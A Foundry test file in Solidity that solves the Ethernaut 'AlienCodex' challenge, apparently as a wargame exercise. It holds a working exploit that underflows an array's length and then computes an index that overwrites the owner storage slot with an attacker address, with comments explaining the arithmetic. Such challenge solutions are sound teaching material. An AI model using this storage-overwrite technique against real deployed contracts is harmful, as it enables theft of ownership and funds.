// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/AlienCodex.sol";


contract TestAlienCodex is Test {
    AlienCodex alienCodex;
    address deployer = address(0x51);
    address attacker = address(0x52);
    address alienCodexAddress = address(0x53);

    function setUp() external {
        string memory data = vm.readFile("./ethernaut/AlienCodex.bin");
        bytes memory _bytecode = vm.parseBytes(data);
        vm.etch(alienCodexAddress, _bytecode);
        alienCodex = AlienCodex(alienCodexAddress);
        vm.prank(address(0));
        alienCodex.transferOwnership(deployer);
    }

    function testExploit() external {
        assertEq(alienCodex.owner(), deployer);
        alienCodex.make_contact();
        assertEq(alienCodex.contact(), true);
        alienCodex.retract();
        bytes32 arrayStartPosition = keccak256(abi.encodePacked(uint256(1)));
        unchecked {
            // x[i] = k will be set in the following way:
            // storage slot will be calculated using: startPosition + index
            // https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/
            // startPosition is calculated as keccak256(slot of x)
            // index here refers to variable i or the position in the array
            // However, in order to set any position in the array; array.length > position
            // This check is bypassed using alienCodex.retract() as it causes the length to overflow
            // The next trick is to trick the array indexing to point to the owner storage slot
            // owner storage slot in the contract is 0
            // so here's the trick:
            // startPosition + (type(uint).max + 1 - startPosition)
            // = type(uint).max + 1 = 0(overflow)
            // so if we provide (type(uint).max + 1 - startPosition) as input to revise
            // then that should index the owner slot
            uint position = type(uint).max + 1 - uint(arrayStartPosition);
            alienCodex.revise(position, bytes32(uint(uint160(attacker))));
        }
        assertEq(alienCodex.owner(), attacker);
    }
}
